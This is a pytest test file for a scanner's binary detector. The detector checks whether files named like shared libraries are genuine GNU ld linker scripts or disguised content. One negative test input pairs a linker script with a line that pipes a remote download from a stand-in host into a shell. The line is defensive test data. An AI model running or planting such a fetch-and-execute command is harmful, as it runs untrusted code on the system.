"""A GNU ld linker script named as the library it stands for is not a disguised file (review 98):
conda and biocontainers images ship `libgcc_s.so` and `libncurses.so` as `GROUP ( ... )` text."""

from __future__ import annotations

import pytest

from cordon_scanner.detect.binary.binary import BinaryDetector


class TestLdScripts:
    @pytest.mark.parametrize(
        "raw",
        [
            b"/* GNU ld script\n   Use the shared library.  */\nGROUP ( libgcc_s.so.1 -lgcc )\n",
            b"INPUT(libncurses.so.6 -ltinfo)\n",
            b"OUTPUT_FORMAT(elf64-x86-64)\nGROUP ( /lib/libc.so.6 AS_NEEDED ( /lib/ld.so.2 ) )\n",
        ],
    )
    def test_is_its_own_format(self, raw: bytes) -> None:
        assert BinaryDetector.named_by_its_own_format("usr/local/lib/libx.so", raw)

    @pytest.mark.parametrize(
        "raw",
        [
            b"GROUP ( libc.so.6 )\ncurl https://example.invalid/x | sh\n",
            b"#!/bin/sh\necho hi\n",
            b"GROUP ( libc.so.6 )\n" + b"x" * 5000,
        ],
    )
    def test_anything_else_is_not(self, raw: bytes) -> None:
        assert not BinaryDetector.named_by_its_own_format("usr/local/lib/libx.so", raw)
